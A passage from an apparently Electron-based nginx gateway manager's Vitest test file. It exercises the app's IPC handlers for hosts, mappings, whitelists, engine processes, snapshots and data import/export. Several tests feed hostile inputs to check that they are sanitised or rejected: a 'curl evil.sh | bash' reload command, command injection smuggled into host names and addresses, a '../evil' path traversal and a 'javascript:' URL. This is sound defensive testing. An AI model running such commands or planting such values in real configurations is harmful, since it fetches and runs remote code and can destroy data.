import type { Mapping, MappingInput } from '@ngj/shared/types'
import { chmodSync, existsSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import http from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { API } from '@ngj/shared/types'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { decryptPassword } from './crypto'
import { closeDb, getDb, openDb } from './db/connection'
import { listHosts } from './db/hostRepo'
import { registerIpcHandlers } from './ipc'
import { setActiveEngine, setEngineDirty } from './nginx/engineRegistry'
import { __setAppRootForTest } from './paths'

/**
 * IPC 层 e2e：用 fake ipcMain 捕获 registerIpcHandlers 注册的全部 handler，
 * 逐一真实调用（真实 SQLite + 真实文件系统 + 真实引擎进程管理）。
 *
 * 与 UI 无关、与 Electron 无关，macOS / Windows / Linux 原生可跑；
 * 依赖真实子进程的引擎生命周期用例在 win32 上跳过（现代 Node spawn .bat 抛 EINVAL，
 * 见 CVE-2024-27980），win32 分支的进程控制逻辑由 localEngine.win32.test.ts 用 mock 覆盖。
 */

const IS_WIN = process.platform === 'win32'

class FakeIpcMain {
  private handlers = new Map<string, (...args: any[]) => any>()

  handle(channel: string, fn: (...args: any[]) => any): void {
    this.handlers.set(channel, fn)
  }

  has(channel: string): boolean {
    return this.handlers.has(channel)
  }

  async invoke(channel: string, ...args: any[]): Promise<any> {
    const fn = this.handlers.get(channel)
    if (!fn)
      throw new Error(`No handler registered for ${channel}`)
    return await fn({}, ...args)
  }
}

const ipc = new FakeIpcMain()
let root = ''

beforeAll(() => {
  root = join(tmpdir(), `ngj-e2e-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`)
  mkdirSync(root, { recursive: true })
  __setAppRootForTest(root)
  openDb()
  registerIpcHandlers(ipc as any)
})

afterAll(() => {
  try { closeDb() }
  catch { /* wipe 用例后 DB 已关闭 */ }
  try { rmSync(root, { recursive: true, force: true }) }
  catch { /* Windows 上文件锁偶尔延迟，忽略 */ }
})

/** 清空业务表 + 引擎注册表，用例间隔离 */
function resetDbState(): void {
  const db = getDb()
  for (const t of ['app_logs', 'config_snapshots', 'mappings', 'hosts', 'ip_whitelist'])
    db.prepare(`DELETE FROM ${t}`).run()
  setActiveEngine(null)
  setEngineDirty(false)
}

/** 造一个按参数模拟 nginx 语义的假 nginx：-t/-s 校验完立即退出；否则写 pid 并常驻、忽略 SIGHUP */
function makeFakeNginx(dir: string): string {
  const p = join(dir, 'fake-nginx.sh')
  writeFileSync(p, [
    '#!/bin/bash',
    'for a in "$@"; do',
    '  if [ "$a" = "-t" ] || [ "$a" = "-s" ]; then',
    '    exit 0',
    '  fi',
    'done',
    `echo $$ > '${dir}/fake.pid'`,
    'trap "" HUP',
    'while true; do sleep 1; done',
  ].join('\n'))
  chmodSync(p, 0o755)
  return p
}

function mkMappingInput(hostId: string, over: Partial<MappingInput> = {}): MappingInput {
  return {
    hostId,
    name: 'e2e 映射',
    enabled: 1,
    protocol: 'http',
    listenPort: 18080,
    serverNames: 'e2e.local',
    listenPath: '/',
    upstreamHost: '127.0.0.1',
    upstreamPort: 9999,
    tlsCertPath: null,
    tlsKeyPath: null,
    redirectHttp: 0,
    extraDirectives: null,
    proxyMode: 'standard',
    proxyHeaders: null,
    proxyPassUrl: null,
    healthCheckEnabled: 0,
    healthCheckIntervalSec: 30,
    healthCheckTargetPath: null,
    healthCheckExpectedStatus: null,
    ...over,
  }
}

async function createLocalHost(name: string, nginxPath = ''): Promise<string> {
  const h = await ipc.invoke(API.HOST_CREATE, {
    name,
    type: 'local',
    isDefault: 0,
    localConfig: { nginxPath, confDir: '', logDir: '' },
    remoteConfig: null,
  })
  return h.id
}

// ─────────────────────────────────────────────────────────────
// 注册完整性：API 常量里的每个通道都必须有 handler
// ─────────────────────────────────────────────────────────────
describe('通道注册完整性（死通道已清理）', () => {
  it('api 常量中的每个通道均已注册 handler，无死通道', () => {
    const missing = Object.values(API).filter(ch => !ipc.has(ch))
    expect(missing).toEqual([])
  })
})

// ─────────────────────────────────────────────────────────────
// Host
// ─────────────────────────────────────────────────────────────
describe('host e2e', () => {
  beforeEach(resetDbState)

  it('create → list → update → set-default → delete 全链路', async () => {
    const id = await createLocalHost('主机A')
    let hosts = await ipc.invoke(API.HOST_LIST)
    expect(hosts).toHaveLength(1)
    expect(hosts[0].name).toBe('主机A')
    expect(hosts[0].localConfig).toEqual({ nginxPath: '', confDir: '', logDir: '' })

    await ipc.invoke(API.HOST_UPDATE, id, { name: '主机A改' })
    hosts = await ipc.invoke(API.HOST_LIST)
    expect(hosts[0].name).toBe('主机A改')

    await ipc.invoke(API.HOST_SET_DEFAULT, id)
    const def = listHosts().find(h => h.id === id)
    expect(def?.isDefault).toBe(1)

    expect(await ipc.invoke(API.HOST_DELETE, id)).toBe(true)
    expect(await ipc.invoke(API.HOST_LIST)).toHaveLength(0)
  })

  it('create 带 PLAIN: 明文密码 → 落库为密文，可解密回原文', async () => {
    await ipc.invoke(API.HOST_CREATE, {
      name: '远程机',
      type: 'remote',
      isDefault: 0,
      localConfig: null,
      remoteConfig: {
        host: '192.0.2.1',
        port: 22,
        username: 'root',
        authType: 'password',
        passwordEncrypted: 'PLAIN:s3cret!',
        keyPath: null,
        nginxPath: '/usr/sbin/nginx',
        confPath: '/etc/nginx/nginx.conf',
        reloadCmd: 'nginx -s reload',
        testCmd: 'nginx -t',
      },
    })
    const [h] = await ipc.invoke(API.HOST_LIST)
    expect(h.remoteConfig.passwordEncrypted).not.toBe('PLAIN:s3cret!')
    expect(h.remoteConfig.passwordEncrypted.startsWith('PLAIN:')).toBe(false)
    expect(decryptPassword(h.remoteConfig.passwordEncrypted)).toBe('s3cret!')
  })

  it('switch 不存在的主机 → ok:false', async () => {
    const r = await ipc.invoke(API.HOST_SWITCH, 'no-such-host')
    expect(r.ok).toBe(false)
    expect(r.error).toContain('主机不存在')
  })

  it('switch 本地主机 → 引擎 kind=local 且支持进程控制（bundled nginx 不存在也不报错，惰性创建）', async () => {
    const id = await createLocalHost('本地')
    expect((await ipc.invoke(API.HOST_SWITCH, id)).ok).toBe(true)
    expect(await ipc.invoke(API.ENGINE_KIND_GET)).toEqual({ engineKind: 'local', supportsProcessControl: true })
  })

  it('bundled nginx 缺失时 ENGINE_START 返回错误信息而非崩溃（跨平台安全路径）', async () => {
    const id = await createLocalHost('本地')
    await ipc.invoke(API.HOST_SWITCH, id)
    const r = await ipc.invoke(API.ENGINE_START)
    expect(r.status).not.toBe('running')
    expect(r.error).toContain('nginx binary not found')
  })

  it('switch 远程主机 → kind=remote，启停被守卫拦截，test-connection 不可达返回 ok:false', async () => {
    const remoteId = await ipc.invoke(API.HOST_CREATE, {
      name: '远程机',
      type: 'remote',
      isDefault: 0,
      localConfig: null,
      remoteConfig: {
        host: '127.0.0.1',
        port: 1,
        username: 'root',
        authType: 'password',
        passwordEncrypted: null,
        keyPath: null,
        nginxPath: '/usr/sbin/nginx',
        confPath: '/etc/nginx/nginx.conf',
        reloadCmd: 'nginx -s reload',
        testCmd: 'nginx -t',
      },
    }).then((h: any) => h.id)

    expect((await ipc.invoke(API.HOST_SWITCH, remoteId)).ok).toBe(true)
    expect(await ipc.invoke(API.ENGINE_KIND_GET)).toEqual({ engineKind: 'remote', supportsProcessControl: false })

    const start = await ipc.invoke(API.ENGINE_START)
    expect(start.error).toContain('远程主机不支持')
    const stop = await ipc.invoke(API.ENGINE_STOP)
    expect(stop.error).toContain('远程主机不支持')

    // SSH 失败时 ENGINE_TEST 兜底返回 {ok:false}（修复前是直接 reject）
    const test = await ipc.invoke(API.ENGINE_TEST)
    expect(test.ok).toBe(false)
    expect(typeof test.output).toBe('string')

    const conn = await ipc.invoke(API.HOST_TEST_CONNECTION, {
      host: '127.0.0.1',
      port: 1,
      username: 'root',
      passwordEncrypted: 'PLAIN:wrong',
    })
    expect(conn.ok).toBe(false)
    expect(typeof conn.output).toBe('string')
  }, 20000)

  it('test-connection 缺主机地址 → 快速失败', async () => {
    const r = await ipc.invoke(API.HOST_TEST_CONNECTION, { host: '' })
    expect(r.ok).toBe(false)
    expect(r.output).toContain('缺少主机地址')
  })
})

// ─────────────────────────────────────────────────────────────
// Mapping
// ─────────────────────────────────────────────────────────────
describe('mapping e2e', () => {
  let hostId: string

  beforeEach(async () => {
    resetDbState()
    hostId = await createLocalHost('映射宿主')
  })

  it('create → list → update → delete，且每步置脏', async () => {
    expect(await ipc.invoke(API.ENGINE_DIRTY_GET)).toBe(false)
    const m = await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))
    expect(m.name).toBe('e2e 映射')
    expect((await ipc.invoke(API.ENGINE_DIRTY_GET))).toBe(true)
    setEngineDirty(false)

    await ipc.invoke(API.MAPPING_UPDATE, m.id, { name: '改名', upstreamPort: 8888 })
    let list: Mapping[] = await ipc.invoke(API.MAPPING_LIST, hostId)
    expect(list[0].name).toBe('改名')
    expect(list[0].upstreamPort).toBe(8888)
    expect(await ipc.invoke(API.ENGINE_DIRTY_GET)).toBe(true)
    setEngineDirty(false)

    expect(await ipc.invoke(API.MAPPING_DELETE, m.id)).toBe(true)
    list = await ipc.invoke(API.MAPPING_LIST, hostId)
    expect(list).toHaveLength(0)
    expect(await ipc.invoke(API.ENGINE_DIRTY_GET)).toBe(true)
  })

  it('非法输入被 handler 拦截（协议/端口/proxy_pass）', async () => {
    await expect(ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, { protocol: 'ftp' as any })))
      .rejects
      .toThrow('非法协议')
    await expect(ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, { listenPort: 70000 })))
      .rejects
      .toThrow('非法监听端口')
    await expect(ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, { proxyPassUrl: 'javascript:alert(1)' })))
      .rejects
      .toThrow('proxy_pass')
    await expect(ipc.invoke(API.MAPPING_UPDATE, 'any', { upstreamPort: -1 }))
      .rejects
      .toThrow('非法上游端口')
  })
})

// ─────────────────────────────────────────────────────────────
// 白名单
// ─────────────────────────────────────────────────────────────
describe('whitelist e2e', () => {
  beforeEach(resetDbState)

  it('add（IP 与 CIDR）→ list → toggle → remove', async () => {
    const e1 = await ipc.invoke(API.WHITELIST_ADD, '10.0.0.0/24', '内网段')
    const e2 = await ipc.invoke(API.WHITELIST_ADD, '1.2.3.4')
    let list = await ipc.invoke(API.WHITELIST_LIST)
    expect(list).toHaveLength(2)

    await ipc.invoke(API.WHITELIST_TOGGLE_IP, e1.id, 0)
    list = await ipc.invoke(API.WHITELIST_LIST)
    expect(list.find((x: any) => x.id === e1.id).enabled).toBe(0)
    expect(list.find((x: any) => x.id === e2.id).enabled).toBe(1)

    await ipc.invoke(API.WHITELIST_REMOVE, e1.id)
    expect(await ipc.invoke(API.WHITELIST_LIST)).toHaveLength(1)
  })

  it('非法 IP 被 handler 拒绝', async () => {
    await expect(ipc.invoke(API.WHITELIST_ADD, '999.1.2.3')).rejects.toThrow('IP 格式不正确')
    await expect(ipc.invoke(API.WHITELIST_ADD, 'not-an-ip')).rejects.toThrow('IP 格式不正确')
  })

  it('enabled 开关 get/set 往返', async () => {
    expect(await ipc.invoke(API.WHITELIST_GET_ENABLED)).toBe(false)
    await ipc.invoke(API.WHITELIST_SET_ENABLED, true)
    expect(await ipc.invoke(API.WHITELIST_GET_ENABLED)).toBe(true)
    await ipc.invoke(API.WHITELIST_SET_ENABLED, false)
    expect(await ipc.invoke(API.WHITELIST_GET_ENABLED)).toBe(false)
  })
})

// ─────────────────────────────────────────────────────────────
// Engine 生命周期（真实进程；win32 跳过——.bat 无法被现代 Node spawn）
// ─────────────────────────────────────────────────────────────
describe.skipIf(IS_WIN)('engine e2e（真实进程生命周期）', () => {
  let hostId: string
  let workDir: string

  beforeEach(async () => {
    resetDbState()
    workDir = join(root, `engine-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`)
    mkdirSync(workDir, { recursive: true })
    hostId = await createLocalHost('引擎宿主', makeFakeNginx(workDir))
    await ipc.invoke(API.HOST_SWITCH, hostId)
  })

  it('stopped → start → running（pid 非空）→ reload 应用映射 + 生成快照 → stop → stopped', async () => {
    expect(await ipc.invoke(API.ENGINE_STATUS)).toBe('stopped')
    expect(await ipc.invoke(API.ENGINE_PID_GET)).toBeNull()

    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))

    const start = await ipc.invoke(API.ENGINE_START)
    expect(start).toEqual({ status: 'running', error: null })
    expect(await ipc.invoke(API.ENGINE_PID_GET)).toBeTypeOf('number')
    expect(await ipc.invoke(API.ENGINE_REFRESH_STATUS)).toBe('running')

    // reload = 生成 conf → 备份 → 写入 → nginx -t → 重载 → 快照
    const reload = await ipc.invoke(API.ENGINE_RELOAD)
    expect(reload.ok).toBe(true)
    expect(await ipc.invoke(API.ENGINE_DIRTY_GET)).toBe(false)

    const snaps = await ipc.invoke(API.SNAPSHOT_LIST, hostId)
    expect(snaps.length).toBeGreaterThanOrEqual(1)
    expect(snaps[0].content).toContain('18080')
    expect(snaps[0].content).toContain('e2e.local')

    const stop = await ipc.invoke(API.ENGINE_STOP)
    expect(stop).toEqual({ status: 'stopped', error: null })
    expect(await ipc.invoke(API.ENGINE_PID_GET)).toBeNull()
  }, 20000)

  it('重复 start 返回错误但进程保持 running', async () => {
    await ipc.invoke(API.ENGINE_START)
    const again = await ipc.invoke(API.ENGINE_START)
    expect(again.status).toBe('running')
    expect(again.error).toContain('already running')
    await ipc.invoke(API.ENGINE_STOP)
  }, 20000)

  it('白名单开启但无 IP → ENGINE_RELOAD 守卫拒绝；补 IP 后放行且 conf 带 allow', async () => {
    await ipc.invoke(API.ENGINE_START)
    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))
    await ipc.invoke(API.WHITELIST_SET_ENABLED, true)

    const blocked = await ipc.invoke(API.ENGINE_RELOAD)
    expect(blocked.ok).toBe(false)
    expect(blocked.output).toContain('白名单')

    await ipc.invoke(API.WHITELIST_ADD, '127.0.0.1')
    const okRun = await ipc.invoke(API.ENGINE_RELOAD)
    expect(okRun.ok).toBe(true)
    const snaps = await ipc.invoke(API.SNAPSHOT_LIST, hostId)
    expect(snaps[0].content).toContain('allow 127.0.0.1')

    await ipc.invoke(API.WHITELIST_SET_ENABLED, false)
    await ipc.invoke(API.ENGINE_STOP)
  }, 20000)

  it('引擎 test 探针：假 nginx 返回 ok:true 的结构（跨平台管道验证）', async () => {
    const r = await ipc.invoke(API.ENGINE_TEST)
    expect(r.ok).toBe(true)
    expect(typeof r.output).toBe('string')
  })

  it('切换主机时旧引擎进程被停止（修复孤儿 nginx 占端口）', async () => {
    await ipc.invoke(API.ENGINE_START)
    const oldPid = await ipc.invoke(API.ENGINE_PID_GET)
    expect(oldPid).toBeTypeOf('number')

    const hostB = await createLocalHost('引擎宿主B', makeFakeNginx(workDir))
    expect((await ipc.invoke(API.HOST_SWITCH, hostB)).ok).toBe(true)

    // 旧进程应已死亡（SIGTERM 异步送达，轮询等待）
    const deadline = Date.now() + 5000
    let dead = false
    while (Date.now() < deadline) {
      try {
        process.kill(oldPid, 0)
        await new Promise(r => setTimeout(r, 50))
      }
      catch {
        dead = true
        break
      }
    }
    expect(dead).toBe(true)
  }, 20000)

  it('停止态 RELOAD：写入+校验通过、提示启动后生效、产生快照（修复停止态无法应用）', async () => {
    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))
    const r = await ipc.invoke(API.ENGINE_RELOAD)
    expect(r.ok).toBe(true)
    expect(r.output).toContain('未运行')
    expect(r.output).toContain('启动 nginx 后生效')
    expect(existsSync(join(root, 'data', 'nginx-home', 'conf', 'nginx.conf'))).toBe(true)
    expect((await ipc.invoke(API.SNAPSHOT_LIST, hostId)).length).toBe(1)
    expect(await ipc.invoke(API.ENGINE_DIRTY_GET)).toBe(false)
  })

  it('停止态 rollback：conf 写入+校验通过即成功（与停止态应用一致）', async () => {
    await ipc.invoke(API.ENGINE_START)
    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))
    await ipc.invoke(API.ENGINE_RELOAD)
    await ipc.invoke(API.ENGINE_STOP)

    const snaps = await ipc.invoke(API.SNAPSHOT_LIST, hostId)
    const r = await ipc.invoke(API.SNAPSHOT_ROLLBACK, snaps[0].id)
    expect(r.ok).toBe(true)
    expect(await ipc.invoke(API.ENGINE_DIRTY_GET)).toBe(true)
  }, 20000)
})

// 引擎未激活时的通用守卫（含 win32）
describe('engine 守卫（无活动引擎）', () => {
  beforeEach(resetDbState)

  it('无引擎时 status=unknown、reload/test 失败、pid=null', async () => {
    expect(await ipc.invoke(API.ENGINE_STATUS)).toBe('unknown')
    expect(await ipc.invoke(API.ENGINE_PID_GET)).toBeNull()
    const reload = await ipc.invoke(API.ENGINE_RELOAD)
    expect(reload.ok).toBe(false)
    const test = await ipc.invoke(API.ENGINE_TEST)
    expect(test.ok).toBe(false)
    expect(await ipc.invoke(API.ENGINE_KIND_GET)).toBeNull()
    expect(await ipc.invoke(API.ENGINE_REFRESH_STATUS)).toBe('unknown')
  })
})

// ─────────────────────────────────────────────────────────────
// 模板
// ─────────────────────────────────────────────────────────────
describe('template e2e', () => {
  beforeEach(resetDbState)

  it('builtin 非空；保存自定义 → list 合并 → 删除', async () => {
    const builtin = await ipc.invoke(API.TEMPLATE_LIST_BUILTIN)
    expect(builtin.length).toBeGreaterThan(0)
    expect(builtin.every((t: any) => t.builtin)).toBe(true)

    const before = await ipc.invoke(API.TEMPLATE_LIST)
    await ipc.invoke(API.TEMPLATE_SAVE_CUSTOM, {
      id: 'e2e-custom-tpl',
      name: 'E2E 自定义模板',
      icon: 'default',
      category: '测试',
      description: 'e2e 创建',
      mapping: { protocol: 'http', upstreamHost: '10.1.1.1', upstreamPort: 80 },
    })
    const after = await ipc.invoke(API.TEMPLATE_LIST)
    expect(after.length).toBe(before.length + 1)
    const custom = after.find((t: any) => t.id === 'e2e-custom-tpl')
    expect(custom.builtin).toBe(false)
    expect(custom.mapping.protocol).toBe('http')

    expect(await ipc.invoke(API.TEMPLATE_DELETE_CUSTOM, 'e2e-custom-tpl')).toBe(true)
    expect((await ipc.invoke(API.TEMPLATE_LIST)).find((t: any) => t.id === 'e2e-custom-tpl')).toBeUndefined()
  })

  it('非法模板 id 被拒绝', async () => {
    await expect(ipc.invoke(API.TEMPLATE_SAVE_CUSTOM, {
      id: '../evil',
      name: 'x',
      icon: 'default',
      category: 'x',
      description: '',
      mapping: { protocol: 'http' },
    })).rejects.toThrow('模板 id 非法')
  })
})

// ─────────────────────────────────────────────────────────────
// 操作日志 + Nginx 日志
// ─────────────────────────────────────────────────────────────
describe('log / NginxLog e2e', () => {
  let nginxLogsDir: string

  beforeEach(async () => {
    resetDbState()
    nginxLogsDir = join(root, 'data', 'nginx-home', 'logs')
  })

  it('业务操作产生日志 → list（limit 截断）→ clear', async () => {
    await ipc.invoke(API.HOST_CREATE, {
      name: '日志源',
      type: 'local',
      isDefault: 0,
      localConfig: { nginxPath: '', confDir: '', logDir: '' },
      remoteConfig: null,
    })
    // 日志记在 null 主机名下（HOST_CREATE 的 logger.info 第一参数是 null）
    let logs = await ipc.invoke(API.LOG_LIST, null, 100)
    expect(logs.length).toBeGreaterThan(0)
    expect(logs[0].level).toBe('info')

    // limit 被钳制：超界值不报错
    logs = await ipc.invoke(API.LOG_LIST, null, 999999)
    expect(Array.isArray(logs)).toBe(true)

    expect(await ipc.invoke(API.LOG_CLEAR)).toBe(true)
    // 清空后只剩 clear 动作自身写入的那条日志（handler 设计：clear 后记录清空事件）
    const after = await ipc.invoke(API.LOG_LIST, null, 100)
    expect(after).toHaveLength(1)
    expect(after[0].message).toContain('已清空')
  })

  it('nginx 日志 tail：access 与 stream 合并返回，error 独立', async () => {
    mkdirSync(nginxLogsDir, { recursive: true })
    writeFileSync(join(nginxLogsDir, 'access.log'), 'acc-line-1\nacc-line-2\nacc-line-3\n')
    writeFileSync(join(nginxLogsDir, 'stream_access.log'), 'stream-line-1\n')
    writeFileSync(join(nginxLogsDir, 'error.log'), 'err-line-1\n')

    const r = await ipc.invoke(API.NGINX_LOG_TAIL, 10)
    expect(r.access).toContain('acc-line-1')
    expect(r.access).toContain('stream-line-1')
    expect(r.error).toEqual(['err-line-1'])

    // limit 按文件各自钳制：access.log 取 2 行 + stream_access.log 取 1 行 = 3 行
    const clipped = await ipc.invoke(API.NGINX_LOG_TAIL, 2)
    expect(clipped.access).toHaveLength(3)
    expect(clipped.access).toContain('acc-line-3')
    expect(clipped.access).toContain('stream-line-1')
  })

  it('read-enabled 开关生效；clear 删除日志文件', async () => {
    mkdirSync(nginxLogsDir, { recursive: true })
    writeFileSync(join(nginxLogsDir, 'access.log'), 'a\n')
    writeFileSync(join(nginxLogsDir, 'error.log'), 'e\n')

    expect(await ipc.invoke(API.NGINX_LOG_READ_ENABLED_GET)).toBe(true)
    await ipc.invoke(API.NGINX_LOG_READ_ENABLED_SET, false)
    expect(await ipc.invoke(API.NGINX_LOG_READ_ENABLED_GET)).toBe(false)
    expect(await ipc.invoke(API.NGINX_LOG_TAIL, 10)).toEqual({ access: [], error: [] })
    await ipc.invoke(API.NGINX_LOG_READ_ENABLED_SET, true)

    expect(await ipc.invoke(API.NGINX_LOG_CLEAR)).toBe(true)
    expect(existsSync(join(nginxLogsDir, 'access.log'))).toBe(false)
    expect(existsSync(join(nginxLogsDir, 'error.log'))).toBe(false)
    expect(await ipc.invoke(API.NGINX_LOG_TAIL, 10)).toEqual({ access: [], error: [] })
  })
})

// ─────────────────────────────────────────────────────────────
// 快照（无引擎守卫 + 跨平台可跑部分）
// ─────────────────────────────────────────────────────────────
describe('snapshot e2e（守卫）', () => {
  beforeEach(resetDbState)

  it('快照不存在 → ok:false；无活动引擎 → ok:false', async () => {
    expect((await ipc.invoke(API.SNAPSHOT_ROLLBACK, 'no-such-id')).ok).toBe(false)
    expect((await ipc.invoke(API.SNAPSHOT_ROLLBACK, 'no-such-id')).output).toContain('not found')

    const hostId = await createLocalHost('快照宿主')
    // 直接经 handler 建一条快照数据：通过 import 后再查（避免依赖引擎流程）
    const payload = {
      version: 2,
      exportedAt: Date.now(),
      hosts: [{
        id: hostId,
        name: '快照宿主',
        type: 'local',
        isDefault: 1,
        localConfig: { nginxPath: '', confDir: '', logDir: '' },
        remoteConfig: null,
        status: 'unknown',
        createdAt: Date.now(),
      }],
      mappings: [],
      snapshots: [{ id: 'snap-e2e-1', hostId, content: '# fake conf', reason: 'reload', createdAt: Date.now() }],
      logs: [],
    }
    const imp = await ipc.invoke(API.DATA_IMPORT, payload)
    expect(imp.ok).toBe(true)

    const got = await ipc.invoke(API.SNAPSHOT_GET, 'snap-e2e-1')
    expect(got.content).toBe('# fake conf')
    expect((await ipc.invoke(API.SNAPSHOT_LIST, hostId)).length).toBe(1)

    const r = await ipc.invoke(API.SNAPSHOT_ROLLBACK, 'snap-e2e-1')
    expect(r.ok).toBe(false)
    expect(r.output).toContain('no active engine')
  })
})

// ─────────────────────────────────────────────────────────────
// 健康检查 / 端口 / 网络信息
// ─────────────────────────────────────────────────────────────
describe('health / Port / Network e2e', () => {
  let server: http.Server
  let port: number

  beforeAll(async () => {
    server = http.createServer((req, res) => {
      res.statusCode = req.url === '/bad' ? 503 : 200
      res.end('ok')
    })
    // 绑全部接口（默认），PORT_CHECK 才会判定端口被占用
    await new Promise<void>(r => server.listen(0, r))
    port = (server.address() as any).port
  })

  beforeEach(resetDbState)

  afterAll(() => {
    server.close()
  })

  it('健康检查 HEALTH_CHECK_NOW：http 200 healthy / 期望不符 unhealthy / 不可达 unhealthy / 未知映射 unknown', async () => {
    const hostId = await createLocalHost('健康宿主')
    const okId = (await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, {
      name: 'healthy',
      upstreamPort: port,
    }))).id
    const badExpectId = (await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, {
      name: 'bad-expect',
      upstreamPort: port,
      healthCheckExpectedStatus: 500,
    }))).id
    const deadId = (await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, {
      name: 'dead',
      upstreamPort: 1,
    }))).id

    expect(await ipc.invoke(API.HEALTH_CHECK_NOW, okId)).toBe('healthy')
    expect(await ipc.invoke(API.HEALTH_CHECK_NOW, badExpectId)).toBe('unhealthy')
    expect(await ipc.invoke(API.HEALTH_CHECK_NOW, deadId)).toBe('unhealthy')
    expect(await ipc.invoke(API.HEALTH_CHECK_NOW, 'no-such-mapping')).toBe('unknown')
  }, 20000)

  it('tcp 映射走 TCP 探活', async () => {
    const hostId = await createLocalHost('tcp宿主')
    const id = (await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, {
      name: 'tcp映射',
      protocol: 'tcp',
      upstreamPort: port,
    }))).id
    expect(await ipc.invoke(API.HEALTH_CHECK_NOW, id)).toBe('healthy')
  }, 20000)

  it('端口检查 PORT_CHECK：占用 false / 空闲 true / 非法 false', async () => {
    expect(await ipc.invoke(API.PORT_CHECK, port)).toBe(false)
    expect(await ipc.invoke(API.PORT_CHECK, port + 1)).toBe(true)
    expect(await ipc.invoke(API.PORT_CHECK, 0)).toBe(false)
    expect(await ipc.invoke(API.PORT_CHECK, 70000)).toBe(false)
  })

  it('本机 IP 列表 GET_LOCAL_IPS：返回结构合法的数组', async () => {
    const ips = await ipc.invoke(API.GET_LOCAL_IPS)
    expect(Array.isArray(ips)).toBe(true)
    for (const ip of ips) {
      expect(typeof ip.interface).toBe('string')
      expect(ip.address).toMatch(/^\d+\.\d+\.\d+\.\d+$/)
      expect(ip.family).toBe('IPv4')
    }
  })
})

// ─────────────────────────────────────────────────────────────
// 数据管理（export/import 回环 + 消毒 + wipe，必须放在最后）
// ─────────────────────────────────────────────────────────────
describe('data e2e', () => {
  beforeEach(resetDbState)

  it('export → 改动 → import 全量替换回环', async () => {
    const hostId = await createLocalHost('导出宿主')
    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))
    const exported = await ipc.invoke(API.DATA_EXPORT)
    expect(exported.version).toBe(2)
    expect(exported.hosts).toHaveLength(1)
    expect(exported.mappings).toHaveLength(1)

    // 制造偏移：多一台主机 + 多一条映射
    await createLocalHost('多余主机')
    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId, { name: '多余映射' }))

    const r = await ipc.invoke(API.DATA_IMPORT, JSON.parse(JSON.stringify(exported)))
    expect(r.ok).toBe(true)
    expect(r.hostsImported).toBe(1)
    expect(r.mappingsImported).toBe(1)
    expect(await ipc.invoke(API.HOST_LIST)).toHaveLength(1)
    expect(await ipc.invoke(API.MAPPING_LIST, hostId)).toHaveLength(1)
  })

  it('import 恶意文件被消毒：危险命令/凭据重置', async () => {
    const r = await ipc.invoke(API.DATA_IMPORT, {
      version: 2,
      exportedAt: Date.now(),
      hosts: [{
        id: 'evil-host',
        name: 'evil; rm -rf',
        type: 'remote',
        isDefault: 1,
        localConfig: null,
        remoteConfig: {
          host: '203.0.113.9; evil',
          port: 22,
          username: 'root',
          authType: 'password',
          passwordEncrypted: 'fb1:stolen',
          keyPath: '/evil/key',
          nginxPath: '/evil/nginx',
          confPath: '/evil/nginx.conf',
          reloadCmd: 'curl evil.sh | bash',
          testCmd: 'evil',
        },
        status: 'unknown',
        createdAt: Date.now(),
      }],
      mappings: [],
    })
    expect(r.ok).toBe(true)

    const [h] = await ipc.invoke(API.HOST_LIST)
    expect(h.remoteConfig.reloadCmd).toBe('nginx -s reload')
    expect(h.remoteConfig.testCmd).toBe('nginx -t')
    expect(h.remoteConfig.passwordEncrypted).toBeNull()
    expect(h.remoteConfig.keyPath).toBeNull()
    expect(h.remoteConfig.nginxPath).toBe('/usr/sbin/nginx')
    expect(h.name).not.toContain(';')
  })

  it('import 非法 version / 非对象 → ok:false', async () => {
    expect((await ipc.invoke(API.DATA_IMPORT, { version: 99, hosts: [], mappings: [] })).ok).toBe(false)
    expect((await ipc.invoke(API.DATA_IMPORT, 'not-an-object')).ok).toBe(false)
    expect((await ipc.invoke(API.DATA_IMPORT, { version: 2, hosts: 'nope', mappings: [] })).ok).toBe(false)
  })

  it('export 不包含 SSH 密码密文（DPAPI 泄露面收敛）', async () => {
    await ipc.invoke(API.HOST_CREATE, {
      name: '带密主机',
      type: 'remote',
      isDefault: 0,
      localConfig: null,
      remoteConfig: {
        host: '192.0.2.5',
        port: 22,
        username: 'root',
        authType: 'password',
        passwordEncrypted: 'PLAIN:topsecret',
        keyPath: null,
        nginxPath: '/usr/sbin/nginx',
        confPath: '/etc/nginx/nginx.conf',
        reloadCmd: 'nginx -s reload',
        testCmd: 'nginx -t',
      },
    })
    const exported = await ipc.invoke(API.DATA_EXPORT)
    const h = exported.hosts.find((x: any) => x.name === '带密主机')
    expect(h.remoteConfig.passwordEncrypted).toBeNull()
  })

  it('清空数据 DATA_WIPE：错误 token 拒绝；正确 token 清空并自愈（重开 DB + 重建默认主机/引擎），无需重启', async () => {
    const hostId = await createLocalHost('将被清除')
    await ipc.invoke(API.MAPPING_CREATE, mkMappingInput(hostId))
    expect(existsSync(join(root, 'data', 'data.db'))).toBe(true)

    expect(await ipc.invoke(API.DATA_WIPE, 'WRONG_TOKEN')).toEqual({ ok: false, output: expect.any(String) })

    const r = await ipc.invoke(API.DATA_WIPE, 'CONFIRM_WIPE')
    expect(r.ok).toBe(true)
    // 自愈：DB 已重开且旧数据清空，默认主机已重建，引擎已切回本地
    const hosts = await ipc.invoke(API.HOST_LIST)
    expect(hosts).toHaveLength(1)
    expect(hosts[0].name).toBe('本机网关')
    expect(hosts[0].isDefault).toBe(1)
    expect(await ipc.invoke(API.MAPPING_LIST, hostId)).toHaveLength(0)
